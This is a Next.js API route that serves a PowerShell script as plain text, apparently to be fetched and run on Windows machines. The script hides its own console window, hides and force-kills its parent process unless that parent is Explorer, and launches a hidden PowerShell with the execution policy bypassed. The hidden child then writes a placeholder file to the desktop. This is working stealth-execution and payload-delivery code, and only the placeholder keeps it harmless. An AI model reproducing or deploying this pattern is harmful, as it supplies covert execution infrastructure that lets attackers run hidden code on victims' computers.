import { NextRequest, NextResponse } from 'next/server';

export async function GET(req: NextRequest) {
    const script = `
add-type -name user32 -namespace win32 -memberDefinition '[DllImport("user32.dll")] public static extern bool ShowWindow(IntPtr hWnd, Int32 nCmdShow);'
[win32.user32]::showWindow((get-process -id $pid).mainWindowHandle, 0);

$proc = [System.Diagnostics.Process]::GetCurrentProcess()
$parent = Get-Process -Id (gwmi win32_process | ? processid -eq  $proc.Id).parentprocessid
if($parent.ProcessName -ne "explorer"){[win32.user32]::showWindow($parent.mainWindowHandle, 0)};
$script = {
    Start-Sleep -Seconds 5
    Add-Content -Path ([Environment]::GetFolderPath('Desktop')+'/a.txt') -Value test
    Read-Host
    }
Start-Process powershell -WindowStyle Hidden -ArgumentList @("-WindowStyle", "Hidden", "-noexit", "-ExecutionPolicy", "Bypass", $script.ToString());

if($parent.ProcessName -ne "explorer"){Stop-Process -InputObject $parent -Force};
Exit`
  return new NextResponse(script, {
    status: 200,
    headers: { 'Content-Type': 'text/plain' }
  });
}